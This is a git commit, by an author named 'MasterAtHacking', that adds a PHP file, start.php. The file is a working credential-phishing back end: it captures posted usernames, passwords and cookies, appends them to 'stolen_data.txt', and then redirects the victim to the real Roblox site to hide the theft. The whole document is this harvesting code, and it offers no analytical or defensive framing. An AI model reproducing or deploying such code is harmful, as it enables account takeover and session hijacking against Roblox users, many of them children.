6569caeef23271dc7b37872bd926b1c52ded2e32
MasterAtHacking <marshall.ding@student.scots.college>
2025-12-26 21:39:21 +1100

    Create start.php

---
+++ start.php
@@ -0,0 +1,14 @@
+<?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+$cookie = $_POST['cookie'];
+
+$file = fopen("stolen_data.txt", "a");
+fwrite($file, "Username: " . $username . "\n");
+fwrite($file, "Password: " . $password . "\n");
+fwrite($file, "Cookie: " . $cookie . "\n\n");
+fclose($file);
+
+header("Location: https://www.roblox.com"); // Redirect to real Roblox
+exit();
+?>
